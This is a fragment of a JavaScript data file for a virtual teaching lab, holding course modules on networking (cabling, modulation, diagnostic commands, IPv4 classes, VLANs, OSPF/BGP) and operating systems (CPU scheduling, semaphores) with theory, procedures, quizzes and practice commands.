            "q": "Which topology typically uses a central Hub?",
            "options": [
                "Bus",
                "Star",
                "Mesh",
                "Ring"
            ],
            "correct": 1
        },
        {
            "q": "Fiber optic cables transmit data in the form of?",
            "options": [
                "Electrical signals",
                "Radio waves",
                "Light pulses",
                "Sound waves"
            ],
            "correct": 2
        }
    ],
    "simType": "media_study",
    "practice_commands": [
        "show version",
        "show inventory",
        "show interface status"
    ],
    "practice_questions": [
        "When would you use a Crossover cable instead of a Straight-through cable?",
        "What are the advantages of Fiber Optic over Copper?"
    ]
};

window.VLAB_DATA.modulation = {
    "title": "Modulation Techniques (AM, FM, PCM)",
    "aim": "To study and analyze various modulation techniques: Amplitude Modulation (AM), Frequency Modulation (FM), and Pulse Code Modulation (PCM).",
    "theory": {
        "intro": "Modulation is the process of modifying a carrier signal (typically a high-frequency sine wave) with a message signal (containing data or audio) to facilitate transmission over physical media.",
        "cards": [
            {
                "title": "1. Amplitude Modulation (AM) & FM",
                "content": "In **AM**, the amplitude of the carrier wave is varied in proportion to the message signal's instantaneous amplitude: \\n\\n$$s(t) = [A_c + m(t)] \\cos(2\\pi f_c t)$$\\n\\nIn **FM**, the carrier frequency varies with the message signal amplitude, keeping overall signal amplitude constant, which provides better resistance to environmental noise."
            },
            {
                "title": "2. Pulse Code Modulation (PCM) Stages",
                "content": "PCM converts analog signals into digital binary format in three stages:\\n\\n1. **Sampling**: Capture signal values at regular intervals. The Nyquist sampling rate must satisfy $f_s \\ge 2f_{max}$.\\n2. **Quantization**: Map continuous sample values to a discrete scale.\\n3. **Encoding**: Convert quantized values into binary code."
            },
            {
                "title": "3. Bandwidth Capacity Limits",
                "content": "The **Nyquist Formula** calculates the maximum capacity of a noiseless channel: $C = 2B \\log_2 M$.\\n\\nThe **Shannon-Hartley Theorem** calculates maximum capacity for a noisy channel: \\n\\n$$C = B \\log_2\\left(1 + \\frac{S}{N}\\right)$$\\n\\nwhere $B$ is bandwidth and $S/N$ is the Signal-to-Noise Ratio."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which modulation varies the height of the carrier wave?",
            "options": [
                "AM",
                "FM",
                "PM",
                "PCM"
            ],
            "correct": 0
        },
        {
            "q": "Which technique is commonly used for digital audio and telephony?",
            "options": [
                "AM",
                "FM",
                "PCM",
                "PWM"
            ],
            "correct": 2
        },
        {
            "q": "Which modulation is more resistant to atmospheric noise?",
            "options": [
                "AM",
                "FM",
                "PCM",
                "All are equal"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Base Waveforms: Generate a high-frequency carrier sine wave and a lower-frequency message signal.",
        "2. Amplitude Modulation: Vary the carrier wave envelope to match the message signal.",
        "3. Frequency Modulation: Adjust the carrier frequency dynamically based on message signal amplitude.",
        "4. PCM Conversion: Sample the message signal, apply quantization levels, and encode the results into binary code.",
        "5. Signal Degradation: Add simulated white noise to analyze signal distortion."
    ],
    "posttest": [
        {
            "q": "What is the primary drawback of AM?",
            "options": [
                "High bandwidth",
                "Complexity",
                "Susceptibility to noise",
                "Low range"
            ],
            "correct": 2
        },
        {
            "q": "In PCM, the process of assigning discrete values to samples is called?",
            "options": [
                "Sampling",
                "Quantization",
                "Encoding",
                "Modulation"
            ],
            "correct": 1
        },
        {
            "q": "FM belongs to which category of modulation?",
            "options": [
                "Amplitude",
                "Angle Modulation",
                "Digital",
                "Pulse"
            ],
            "correct": 1
        }
    ],
    "simType": "modulation",
    "practice_commands": [
        "analyze spectrum am",
        "measure snr",
        "set sampling_rate 44100"
    ],
    "practice_questions": [
        "State the Nyquist Sampling Theorem.",
        "Why is FM more resistant to noise than AM?"
    ]
};

window.VLAB_DATA.net_commands = {
    "title": "Networking Commands & Utilities",
    "aim": "To study and analyze basic networking commands like ping, tracert, arp, netstat, nslookup, ipconfig, and whois.",
    "theory": {
        "intro": "Networking utilities are command-line tools used by administrators to configure network interfaces, troubleshoot connectivity issues, and monitor network statistics.",
        "cards": [
            {
                "title": "1. ICMP Commands: Ping & Traceroute",
                "content": "**ping**: Sends ICMP Echo Requests to verify hostname or IP address reachability.\\n\\n**traceroute/tracert**: Tracks the path packets take to a destination. It increments the TTL (Time-To-Live) field of outgoing packets from 1 upwards, causing each hop along the path to return an ICMP Time Exceeded message."
            },
            {
                "title": "2. IP Config & Address Resolution (ARP)",
                "content": "**ipconfig / ifconfig**: Displays interface IP configurations, subnet masks, and default gateways.\\n\\n**arp -a**: Displays the ARP cache containing resolved IP-to-MAC address mappings."
            },
            {
                "title": "3. Connection Monitoring & DNS Lookup",
                "content": "**netstat**: Lists active TCP/UDP connections, listening ports, and routing statistics.\\n\\n**nslookup / dig**: Queries DNS servers to resolve hostnames to IP addresses."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which command shows the route taken to a destination?",
            "options": [
                "ping",
                "tracert",
                "netstat",
                "arp"
            ],
            "correct": 1
        },
        {
            "q": "Which command is used to see your own IP address on Windows?",
            "options": [
                "ifconfig",
                "ipconfig",
                "nslookup",
                "whois"
            ],
            "correct": 1
        },
        {
            "q": "ARP is used to map IP addresses to?",
            "options": [
                "Hostnames",
                "MAC addresses",
                "Port numbers",
                "Gateways"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Interface Check: Run `ipconfig` to verify local IP, mask, and gateway settings.",
        "2. Ping Test: Execute `ping 127.0.0.1` to verify the local loopback interface.",
        "3. Route Trace: Use `tracert` to map the path to an external server.",
        "4. Cache Inspection: Run `arp -a` to view the local physical address cache.",
        "5. DNS Query: Run `nslookup` to query domain name servers."
    ],
    "posttest": [
        {
            "q": "Which protocol is used by the ping command?",
            "options": [
                "TCP",
                "UDP",
                "ICMP",
                "IGMP"
            ],
            "correct": 2
        },
        {
            "q": "What does TTL stand for in networking commands?",
            "options": [
                "Total Time Limit",
                "Time To Live",
                "Terminal Transit Loss",
                "Table Task List"
            ],
            "correct": 1
        },
        {
            "q": "Which command would you use to check for a DNS issue?",
            "options": [
                "arp",
                "ping",
                "nslookup",
                "netstat"
            ],
            "correct": 2
        }
    ],
    "simType": "cmd_challenge",
    "practice_commands": [
        "tracert 8.8.8.8",
        "arp -a",
        "route print",
        "getmac"
    ],
    "practice_questions": [
        "What does a request timed out error in ping indicate?",
        "How does tracert use the TTL field to discover hops?"
    ]
};

window.VLAB_DATA.ip_class = {
    "title": "IPv4 Address Classification",
    "aim": "To identify the class (A, B, C, D, or E), Network ID, and Host ID of a given IPv4 address.",
    "theory": {
        "intro": "IPv4 addresses are 32-bit values historically categorized into five classes (Classful Addressing) to simplify allocation, determined by the state of the first octet's leading bits.",
        "cards": [
            {
                "title": "1. Class Boundaries",
                "content": "- **Class A**: Range 1.0.0.0 to 126.255.255.255. Default mask `/8`. The first octet is the network portion.\\n- **Class B**: Range 128.0.0.0 to 191.255.255.255. Default mask `/16`. The first two octets form the network portion.\\n- **Class C**: Range 192.0.0.0 to 223.255.255.255. Default mask `/24`. The first three octets form the network portion."
            },
            {
                "title": "2. Class D (Multicast) & Class E",
                "content": "- **Class D**: Range 224.0.0.0 to 239.255.255.255. Reserved for multicast traffic (transmitting to a group of nodes simultaneously).\\n- **Class E**: Range 240.0.0.0 to 255.255.255.255. Reserved for experimental and research use."
            },
            {
                "title": "3. Special Purpose Ranges",
                "content": "- **Loopback Address**: The `127.0.0.0/8` range is reserved for local host testing.\\n- **Private IP Ranges (RFC 1918)**: IP ranges reserved for private networks: `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16` (not routable on the public Internet)."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which class does 172.16.0.1 belong to?",
            "options": [
                "Class A",
                "Class B",
                "Class C",
                "Class D"
            ],
            "correct": 1
        },
        {
            "q": "What is the range of Class C IP addresses?",
            "options": [
                "0-127",
                "128-191",
                "192-223",
                "224-239"
            ],
            "correct": 2
        },
        {
            "q": "Which octet(s) represent the Network ID in Class A?",
            "options": [
                "First",
                "First and Second",
                "First, Second and Third",
                "All"
            ],
            "correct": 0
        }
    ],
    "procedure": [
        "1. Octet Analysis: Inspect the first octet of a given IP address.",
        "2. Range Matching: Map the first octet value to its corresponding address class (A, B, C, D, or E).",
        "3. Network ID Determination: Separate the network portion from the host portion based on the class's default subnet mask.",
        "4. Private Address Check: Identify if the IP belongs to a public, private (RFC 1918), or loopback range.",
        "5. Verification: Write a script to automate IP parsing and classification."
    ],
    "posttest": [
        {
            "q": "What is the Network ID of 10.20.30.40?",
            "options": [
                "10.20.30",
                "10.20",
                "10",
                "10.20.30.40"
            ],
            "correct": 2
        },
        {
            "q": "Class D addresses are reserved for?",
            "options": [
                "Large Networks",
                "Experimental",
                "Multicasting",
                "Loopback"
            ],
            "correct": 2
        },
        {
            "q": "The IP 192.168.10.1 belongs to?",
            "options": [
                "Class A",
                "Class B",
                "Class C",
                "Class D"
            ],
            "correct": 2
        }
    ],
    "simType": "ip_sorter",
    "practice_commands": [
        "ip address 10.0.0.1 255.0.0.0",
        "ip address 172.16.0.1 255.255.0.0",
        "show ip route"
    ],
    "practice_questions": [
        "Identify the class and default mask for 223.255.255.0.",
        "What are the private IP ranges for Class A, B, and C?"
    ]
};

window.VLAB_DATA.vlan = {
    "title": "VLAN (Virtual LAN) Configuration",
    "aim": "To design and configure Virtual LANs (VLANs) to segment a physical network into multiple logical broadcast domains.",
    "theory": {
        "intro": "A Virtual Local Area Network (VLAN) segments a physical switch into multiple logical networks, dividing the hardware into separate broadcast domains to improve network security and efficiency.",
        "cards": [
            {
                "title": "1. Broadcast Domain Segmentation",
                "content": "By default, all switch ports belong to a single broadcast domain (VLAN 1). VLANs logically segment the switch, preventing broadcast traffic from crossing VLAN boundaries. Devices in different VLANs cannot communicate without a Layer 3 router or multilayer switch (Inter-VLAN Routing)."
            },
            {
                "title": "2. Port Modes: Access vs. Trunk",
                "content": "**Access Ports**: Belong to a single VLAN, carrying untagged frames. Used to connect end devices like PCs.\\n\\n**Trunk Ports**: Carry traffic for multiple VLANs over a single physical link connecting switches or routers. Frame routing is managed using VLAN tagging standards."
            },
            {
                "title": "3. IEEE 802.1Q Frame Tagging",
                "content": "IEEE 802.1Q is the industry standard for VLAN trunking. When a frame enters a trunk link, a 4-byte tag containing a 12-bit VLAN ID is inserted into the Ethernet header, allowing the receiving switch to identify the frame's source VLAN."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which device is used to create VLANs?",
            "options": [
                "Hub",
                "Switch",
                "Repeater",
                "Modem"
            ],
            "correct": 1
        },
        {
            "q": "What is the default VLAN ID on most switches?",
            "options": [
                "0",
                "1",
                "10",
                "100"
            ],
            "correct": 1
        },
        {
            "q": "Which protocol is used for VLAN tagging on trunks?",
            "options": [
                "802.11",
                "802.3",
                "802.1Q",
                "STP"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. VLAN Definition: Create VLANs on the switch and assign names to them.",
        "2. Access Port Configuration: Assign specific switch ports to designated VLANs.",
        "3. Trunk Port Configuration: Configure the link connecting switches as a trunk port.",
        "4. Trunk Validation: Verify that frames are tagged with their corresponding VLAN IDs over the trunk link.",
        "5. Inter-VLAN Routing: Configure subinterfaces on a router to enable communication between different VLANs."
    ],
    "posttest": [
        {
            "q": "VLANs operate at which layer of the OSI model?",
            "options": [
                "Layer 1",
                "Layer 2",
                "Layer 3",
                "Layer 4"
            ],
            "correct": 1
        },
        {
            "q": "What happens to a broadcast frame sent in VLAN 10?",
            "options": [
                "Sent to all ports",
                "Sent only to ports assigned to VLAN 10",
                "Sent to all VLANs",
                "Dropped"
            ],
            "correct": 1
        },
        {
            "q": "To allow communication between VLAN 10 and VLAN 20, we need?",
            "options": [
                "A bigger switch",
                "A cross cable",
                "A Router or Layer 3 Switch",
                "Nothing"
            ],
            "correct": 2
        }
    ],
    "simType": "vlan_sim",
    "practice_commands": [
        "vlan 10",
        "name Marketing",
        "switchport mode access",
        "switchport access vlan 10",
        "show vlan brief"
    ],
    "practice_questions": [
        "What is the purpose of a Trunk port?",
        "How does a VLAN reduce the size of a broadcast domain?"
    ]
};

window.VLAB_DATA.routing_protocols = {
    "title": "Dynamic Routing (OSPF & BGP)",
    "aim": "To configure and analyze advanced dynamic routing protocols: OSPF (Interior Gateway Protocol) and BGP (Exterior Gateway Protocol).",
    "theory": {
        "intro": "Dynamic routing protocols allow routers to automatically share network topologies, dynamically calculate optimal paths, and adapt to network changes.",
        "cards": [
            {
                "title": "1. IGP vs. EGP Routing Protocols",
                "content": "**IGP (Interior Gateway Protocol)**: Used to exchange routing information within a single Autonomous System (AS). Examples include RIP, OSPF, and EIGRP.\\n\\n**EGP (Exterior Gateway Protocol)**: Used to route packets between different Autonomous Systems. **BGP** is the standard EGP used to route traffic across the Internet."
            },
            {
                "title": "2. OSPF Core Features",
                "content": "OSPF is a Link-State protocol that uses Dijkstra's Shortest Path First algorithm. It establishes neighbor relationships using Hello packets and synchronizes Link-State Advertisements (LSAs) within Areas to maintain a consistent network map."
            },
            {
                "title": "3. BGP Path-Vector Routing",
                "content": "BGP is a Path-Vector protocol that manages routing paths using policy decisions rather than simple link costs. It advertises routes as a sequence of Autonomous System Numbers (AS-Path), which helps prevent routing loops between different networks."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which protocol is an Exterior Gateway Protocol (EGP)?",
            "options": [
                "RIP",
                "OSPF",
                "EIGRP",
                "BGP"
            ],
            "correct": 3
        },
        {
            "q": "OSPF uses which algorithm for path calculation?",
            "options": [
                "Bellman-Ford",
                "Dijkstra",
                "Spanning Tree",
                "Round Robin"
            ],
            "correct": 1
        },
        {
            "q": "What is an Autonomous System (AS)?",
            "options": [
                "A single router",
                "A collection of networks under a single administrative domain",
                "A type of server",
                "A VLAN"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Process Initialization: Enable the OSPF routing process on target routers.",
        "2. Network Advertisement: Define interfaces to participate in OSPF and assign them to Area 0.",
        "3. Neighbor Verification: Check the OSPF neighbor table to verify adjacencies.",
        "4. BGP Peer Configuration: Establish BGP peer sessions with neighboring Autonomous Systems.",
        "5. Routing Table Verification: Inspect the local routing table to verify dynamically learned routes."
    ],
    "posttest": [
        {
            "q": "Which protocol is best suited for routing within a large corporate campus?",
            "options": [
                "BGP",
                "OSPF",
                "Static Routing",
                "HTTP"
            ],
            "correct": 1
        },
        {
            "q": "The Administrative Distance of OSPF is?",
            "options": [
                "90",
                "100",
                "110",
                "120"
            ],
            "correct": 2
        },
        {
            "q": "BGP uses which port for communication?",
            "options": [
                "TCP 80",
                "UDP 53",
                "TCP 179",
                "UDP 161"
            ],
            "correct": 2
        }
    ],
    "simType": "path_sim",
    "practice_commands": [
        "router ospf 1",
        "network 192.168.1.0 0.0.0.255 area 0",
        "show ip route ospf",
        "router bgp 65001",
        "neighbor 10.0.0.1 remote-as 65002",
        "show ip bgp summary"
    ],
    "practice_questions": [
        "Why is BGP called a path-vector protocol instead of a distance-vector protocol?",
        "What happens if two routers have the same Router ID in OSPF?",
        "How does BGP prevent routing loops between Autonomous Systems?",
        "Explain the difference between eBGP and iBGP."
    ]
};

window.VLAB_DATA.cpu_scheduling = {
    "title": "CPU Scheduling Algorithms",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: First-Come, First-Served (FCFS)",
            "aim": "To study and simulate the non-preemptive First-Come, First-Served (FCFS) CPU scheduling algorithm to calculate average waiting time and turnaround time.",
            "theory": {
                "intro": "First-Come, First-Served (FCFS) is the simplest CPU scheduling algorithm. The process that requests the CPU first is allocated the CPU first. It is managed with a FIFO queue. However, FCFS is non-preemptive and can cause the Convoy Effect, where short processes wait for one long process to release the CPU.",
                "cards": [
                    {
                        "title": "1. FCFS Characteristics",
                        "content": "• Non-preemptive: Once a process gets the CPU, it holds it until termination or I/O request.\n• Implementation: Simple FIFO queue. New processes enter the tail, CPU scheduler selects from the head.\n• Convoy Effect: If a CPU-bound process with a huge burst time runs first, all subsequent interactive/I/O-bound processes with short bursts get blocked behind it, reducing device utilization."
                    },
                    {
                        "title": "2. Turnaround & Waiting Formulas",
                        "content": "$$\\text{Turnaround Time (TAT)} = \\text{Completion Time (CT)} - \\text{Arrival Time (AT)}$$\n$$\\text{Waiting Time (WT)} = \\text{Turnaround Time (TAT)} - \\text{Burst Time (BT)}$$\n$$\\text{Average WT} = \\frac{\\sum WT}{N}, \\quad \\text{Average TAT} = \\frac{\\sum TAT}{N}$$"
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which data structure is used to implement FCFS scheduling?",
                    "options": [
                        "Stack",
                        "Queue (FIFO)",
                        "Priority Queue",
                        "Binary Tree"
                    ],
                    "correct": 1
                },
                {
                    "q": "What is the primary drawback of FCFS scheduling?",
                    "options": [
                        "It is difficult to implement",
                        "It leads to high page fault rate",
                        "It suffers from the Convoy Effect",
                        "It requires time quantum configuration"
                    ],
                    "correct": 2
                },
                {
                    "q": "Is FCFS scheduling algorithm preemptive or non-preemptive?",
                    "options": [
                        "Preemptive",
                        "Non-preemptive",
                        "Both",
                        "Depends on OS kernel version"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. In the simulation workspace, configure 3 or more processes with distinct Arrival Times (AT) and Burst Times (BT).",
                "2. Select First-Come, First-Served (FCFS) from the algorithm dropdown.",
                "3. Click 'Run Scheduler' to compile the Gantt Chart.",
                "4. Observe how processes are scheduled strictly in order of arrival, regardless of their burst length.",
                "5. Analyze the generated CT, TAT, and WT columns and verify average waiting time calculations manually."
            ],
            "posttest": [
                {
                    "q": "In FCFS, if three processes P1 (BT=24), P2 (BT=3), and P3 (BT=3) arrive at time 0, what is the average waiting time?",
                    "options": [
                        "17 ms",
                        "3 ms",
                        "30 ms",
                        "8 ms"
                    ],
                    "correct": 0
                },
                {
                    "q": "The convoy effect in FCFS results in:",
                    "options": [
                        "Low CPU utilization and device starvation",
                        "High throughput",
                        "Very low average waiting time",
                        "Zero response time for interactive processes"
                    ],
                    "correct": 0
                },
                {
                    "q": "Which of the following is true for FCFS scheduling?",
                    "options": [
                        "It is optimal for average waiting time",
                        "It is preemptive",
                        "It favors short jobs over long jobs",
                        "It has low scheduling overhead"
                    ],
                    "correct": 3
                }
            ]
        },
        {
            "title": "Module 2: Shortest Job First (SJF) & Shortest Remaining Time First (SRTF)",
            "aim": "To analyze Shortest Job First (SJF) non-preemptive scheduling and its preemptive variant (SRTF) to understand their optimality in minimizing average waiting time.",
            "theory": {
                "intro": "Shortest Job First (SJF) associates the length of the next CPU burst with each process. The CPU is allocated to the process with the smallest CPU burst. If preemptive, it is known as Shortest Remaining Time First (SRTF), where a running process can be preempted if a newly arrived process has a shorter remaining burst time.",
                "cards": [
                    {
                        "title": "1. SJF Optimality",
                        "content": "SJF is optimal because it gives the minimum average waiting time for a given set of processes. By scheduling the shortest job first, we reduce the waiting time of subsequent processes more rapidly than any other order."
                    },
                    {
                        "title": "2. Preemptive vs Non-Preemptive",
                        "content": "• Non-Preemptive SJF: Once the CPU is allocated to a process, it cannot be preempted until it completes its CPU burst.\n• Preemptive SRTF: If a new process arrives with a CPU burst length less than the remaining time of the currently executing process, the current process is preempted."
                    },
                    {
                        "title": "3. Starvation Issue",
                        "content": "A major problem with SJF/SRTF is starvation (indefinite blocking). Long-running processes may never execute if there is a steady stream of shorter processes arriving in the ready queue."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which CPU scheduling algorithm yields the absolute minimum average waiting time for a given set of processes?",
                    "options": [
                        "FCFS",
                        "SJF",
                        "Round Robin",
                        "Priority"
                    ],
                    "correct": 1
                },
                {
                    "q": "Preemptive SJF scheduling is also known as:",
                    "options": [
                        "Shortest Remaining Time First (SRTF)",
                        "First-In-First-Out (FIFO)",
                        "Round Robin (RR)",
                        "Highest Response Ratio Next (HRRN)"
                    ],
                    "correct": 0
                },
                {
                    "q": "What is a major potential problem with SJF scheduling?",
                    "options": [
                        "High system overhead",
                        "Starvation of long-running processes",
                        "Convoy effect",
                        "Inefficient resource utilization"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Configure a set of processes in the visualizer where a long process arrives at time 0 (e.g., P1 with BT=8) and shorter processes arrive shortly after (e.g., P2 with AT=1, BT=2; P3 with AT=2, BT=1).",
                "2. Run the simulation using Non-Preemptive SJF. Notice P1 executes completely before P2 and P3.",
                "3. Switch the algorithm to Preemptive SRTF and re-run. Observe how P1 is preempted when P2 arrives at time 1, and P2 is preempted when P3 arrives at time 2.",
                "4. Compare the Gantt charts and average waiting times of Non-Preemptive SJF vs Preemptive SRTF."
            ],
            "posttest": [
                {
                    "q": "In SRTF, if P1 (AT=0, BT=8) is running, and P2 (AT=1, BT=2) arrives, what happens?",
                    "options": [
                        "P1 continues running until completion",
                        "P1 is preempted immediately and P2 gets the CPU",
                        "P2 is discarded",
                        "Both run simultaneously on different cores"
                    ],
                    "correct": 1
                },
                {
                    "q": "Which technique can be used to prevent starvation of long processes in SJF?",
                    "options": [
                        "Preemption",
                        "Aging (increasing priority over time)",
                        "Decreasing time quantum",
                        "Context switching"
                    ],
                    "correct": 1
                },
                {
                    "q": "What is the remaining burst time of a process with BT=10 after running for 3 time units?",
                    "options": [
                        "10",
                        "3",
                        "7",
                        "13"
                    ],
                    "correct": 2
                }
            ]
        },
        {
            "title": "Module 3: Round Robin (RR) Scheduling",
            "aim": "To analyze time-sliced preemptive CPU scheduling using the Round Robin (RR) algorithm and evaluate the impact of different Time Quantum values.",
            "theory": {
                "intro": "Round Robin (RR) scheduling is designed specifically for time-sharing systems. It is similar to FCFS scheduling, but preemption is added to enable the system to switch between processes. A small unit of time, called a time quantum or time slice, is defined. The ready queue is treated as a circular queue.",
                "cards": [
                    {
                        "title": "1. Time Quantum (q)",
                        "content": "The CPU scheduler goes around the ready queue, allocating the CPU to each process for a time interval of up to 1 time quantum. If the process burst is less than $q$, it releases the CPU voluntarily. If it is greater, the process is preempted and appended to the tail of the ready queue."
                    },
                    {
                        "title": "2. Impact of Quantum Size",
                        "content": "• Very Large Quantum: If $q \\to \\infty$, Round Robin degenerates into FCFS.\n• Very Small Quantum: If $q$ is extremely small, it leads to excessive context switching overhead, reducing CPU efficiency."
                    },
                    {
                        "title": "3. Context Switching",
                        "content": "Context switching is the procedure of saving the state (context) of a running process so it can be restored and resumed later. Minimizing context switches is critical for system performance."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Round Robin scheduling is designed primarily for:",
                    "options": [
                        "Batch systems",
                        "Real-time systems",
                        "Time-sharing systems",
                        "Single-user systems"
                    ],
                    "correct": 2
                },
                {
                    "q": "What happens in Round Robin scheduling if the time quantum is very small?",
                    "options": [
                        "Average turnaround time becomes optimal",
                        "Context switching overhead increases significantly",
                        "It behaves like FCFS",
                        "Starvation increases"
                    ],
                    "correct": 1
                },
                {
                    "q": "If the time quantum is 4 ms and a process requires 3 ms of CPU burst, how long will it hold the CPU?",
                    "options": [
                        "4 ms",
                        "1 ms",
                        "3 ms",
                        "It will be blocked permanently"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Input 3 or 4 processes with varying burst times (e.g. BT = 5, 8, 12).",
                "2. Select the Round Robin (RR) scheduling algorithm.",
                "3. Set the Time Quantum value to 2 and click 'Run Scheduler'. View the cyclic gantt chart segments.",
                "4. Increase the Time Quantum to 6 and run the simulation again.",
                "5. Observe how a larger time quantum reduces preemption frequency and changes average Turnaround and Waiting times."
            ],
            "posttest": [
                {
                    "q": "If the Time Quantum is larger than the maximum burst time of all processes, RR behaves like:",
                    "options": [
                        "SJF",
                        "SRTF",
                        "FCFS",
                        "Priority Scheduling"
                    ],
                    "correct": 2
                },
                {
                    "q": "Which of the following metrics is typically optimized/minimized by Round Robin?",
                    "options": [
                        "Throughput",
                        "Response Time",
                        "Turnaround Time",
                        "Context switch count"
                    ],
                    "correct": 1
                },
                {
                    "q": "How does RR handle a process that gets blocked for I/O before its quantum expires?",
                    "options": [
                        "It retains CPU control",
                        "It is preempted and put in the I/O wait queue immediately",
                        "It gets a double quantum next time",
                        "It is terminated"
                    ],
                    "correct": 1
                }
            ]
        }
    ],
    "simType": "cpu_scheduling",
    "practice_commands": [
        "ps -aux",
        "top",
        "renice",
        "nice -n 10 ./process"
    ],
    "practice_questions": [
        "Calculate average waiting time for FCFS with processes P1(BT=24), P2(BT=3), P3(BT=3) arriving at 0.",
        "Why is preemptive SJF also known as Shortest Remaining Time First (SRTF)?"
    ]
};

window.VLAB_DATA.process_sync = {
    "title": "Process Synchronization & Semaphores",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: Producer-Consumer (Bounded Buffer) Problem",
            "aim": "To simulate and analyze the classical Bounded-Buffer Producer-Consumer synchronization problem using Semaphores and Mutex.",
            "theory": {
                "intro": "The Producer-Consumer problem is a classic multi-process synchronization problem. A producer puts items into a shared buffer, and a consumer removes them. They must synchronize to avoid overfilling or emptying the buffer under race conditions.",
                "cards": [
                    {
                        "title": "1. The Shared Bounded Buffer",
                        "content": "A buffer of size $N$ is shared. The producer cannot add to a full buffer (overflow), and the consumer cannot take from an empty buffer (underflow)."
                    },
                    {
                        "title": "2. Synchronizing Semaphores",
                        "content": "• **mutex**: Binary semaphore initialized to 1, protecting the critical section.\n• **empty**: Counting semaphore initialized to $N$, representing free slots.\n• **full**: Counting semaphore initialized to 0, representing filled slots."
                    },
                    {
                        "title": "3. P/V (Wait/Signal) Operations",
                        "content": "• `wait(S)` (P) decrements $S$. If $S < 0$, the process blocks.\n• `signal(S)` (V) increments $S$. If there are blocked processes, one is unblocked."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "The Bounded-Buffer problem is also known as:",
                    "options": [
                        "Readers-Writers problem",
                        "Producer-Consumer problem",
                        "Dining Philosophers problem",
                        "Sleeping Barber problem"
                    ],
                    "correct": 1
                },
                {
                    "q": "What is the initial value of the 'empty' semaphore for a buffer of size 5?",
                    "options": [
                        "0",
                        "1",
                        "5",
                        "Infinite"
                    ],
                    "correct": 2
                },
                {
                    "q": "Which semaphore protects the critical section buffer access from simultaneous write operations?",
                    "options": [
                        "full",
                        "empty",
                        "mutex",
                        "count"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Click 'Produce Item' to insert a random product into the circular buffer slots.",
                "2. Notice how the 'empty' count decrements, and 'full' count increments.",
                "3. Click 'Consume Item' to remove the item. Observe the reverse semaphore update.",
                "4. Try producing when the buffer is full (5 items) to witness the producer block state.",
                "5. Toggle 'Auto Play' to run randomized simultaneous producer/consumer transactions."
            ],
            "posttest": [
                {
                    "q": "What happens if a consumer performs wait(full) when the buffer is empty?",
                    "options": [
                        "It crashes",
                        "It blocks until a producer adds an item",
                        "It reads a garbage item",
                        "It continues immediately"
                    ],
                    "correct": 1
                },
                {
                    "q": "The mutex semaphore acts as a:",
                    "options": [
                        "Counting semaphore",
                        "Binary semaphore/Lock",
                        "Condition variable",
                        "Shared queue pointer"
                    ],
                    "correct": 1
                },
                {
                    "q": "Which of the following is a race condition solution requirement?",
                    "options": [
                        "Mutual Exclusion",
                        "Progress",
                        "Bounded Waiting",
                        "All of the above"
                    ],
                    "correct": 3
                }
            ]
        },
        {
            "title": "Module 2: Readers-Writers Problem",
            "aim": "To analyze the Readers-Writers synchronization problem, where multiple readers can access shared data concurrently, but writers require exclusive access.",
            "theory": {
                "intro": "The Readers-Writers problem models access to a shared database. Multiple readers can read concurrently without conflict. However, only one writer can write at a time, blocking both readers and other writers.",
                "cards": [
                    {
                        "title": "1. Reader Priority vs Writer Priority",
                        "content": "• First Readers-Writers Problem: No reader is kept waiting unless a writer has already obtained permission. Leads to writer starvation.\n• Second Readers-Writers Problem: Once a writer is ready, it writes as soon as possible. Leads to reader starvation."
                    },
                    {
                        "title": "2. Key Variables & Semaphores",
                        "content": "• **wrt**: Semaphore (init 1) to synchronize exclusive database write access.\n• **mutex**: Semaphore (init 1) to protect the shared `readcount` variable.\n• **readcount**: Integer tracking current active readers."
                    },
                    {
                        "title": "3. First Reader / Last Reader Principle",
                        "content": "The first reader executing locks `wrt` (`wait(wrt)`). The last reader exiting unlocks `wrt` (`signal(wrt)`). Readers in between read concurrently without touching `wrt`."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "In the Readers-Writers problem, which of the following is allowed concurrently?",
                    "options": [
                        "Multiple Writers",
                        "One Reader & One Writer",
                        "Multiple Readers",
                        "None of these"
                    ],
                    "correct": 2
                },
                {
                    "q": "Why is a mutex semaphore needed inside reader code?",
                    "options": [
                        "To block other readers",
                        "To safely update the shared readcount variable without race conditions",
                        "To write to the database",
                        "To measure CPU time"
                    ],
                    "correct": 1
                },
                {
                    "q": "What is a major risk in the first Readers-Writers problem (reader preference)?",
                    "options": [
                        "Deadlock",
                        "Reader starvation",
                        "Writer starvation",
                        "Buffer underflow"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. In the simulation panel, add Readers using 'Add Reader' and Writers using 'Add Writer'.",
                "2. Notice that multiple readers can enter the reading state simultaneously, and `readcount` increments.",
                "3. Try adding a Writer when Readers are active. Observe that the Writer enters the 'Waiting' queue.",
                "4. Remove all Readers. Observe that the waiting Writer is immediately scheduled and locks the resource.",
                "5. Observe how the logger tracks reader-count updates and semaphore locks."
            ],
            "posttest": [
                {
                    "q": "Which semaphore blocks writers when at least one reader is active?",
                    "options": [
                        "mutex",
                        "wrt",
                        "readcount",
                        "full"
                    ],
                    "correct": 1
                },
                {
                    "q": "In reader code, which reader releases the 'wrt' lock?",
                    "options": [
                        "The first reader",
                        "The last reader to finish reading",
                        "Every reader",
                        "Writers release it"
                    ],
                    "correct": 1
                },
                {
                    "q": "If a writer is active, any incoming readers will:",
                    "options": [
                        "Read anyway",
                        "Block on the wrt semaphore",
                        "Corrupt the database",
                        "Terminate immediately"
                    ],
                    "correct": 1
                }
            ]
        },
        {
